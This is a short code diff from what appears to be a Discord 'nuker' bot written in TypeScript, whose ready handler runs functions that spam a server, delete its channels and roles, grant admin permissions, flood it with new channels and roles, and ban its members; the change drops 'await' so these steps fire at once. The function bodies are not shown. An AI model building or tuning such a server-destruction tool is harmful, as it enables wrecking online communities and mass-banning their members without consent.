@@ -13,12 +13,12 @@ class Ready {
 	async ready([readyClient]: ArgsOf<"ready">) {
 		const guild = readyClient.guilds.cache.get(process.env.GUILD_ID);
 
-		await spam(guild);
-		await removeChannels(guild);
-		await removeRoles(guild);
-		await giveAdminPerms(guild);
-		await channelsFlood(guild);
-		await rolesFlood(guild);
-		await banMembers(guild);
+		spam(guild);
+		removeChannels(guild);
+		removeRoles(guild);
+		giveAdminPerms(guild);
+		channelsFlood(guild);
+		rolesFlood(guild);
+		banMembers(guild);
 	}
 }
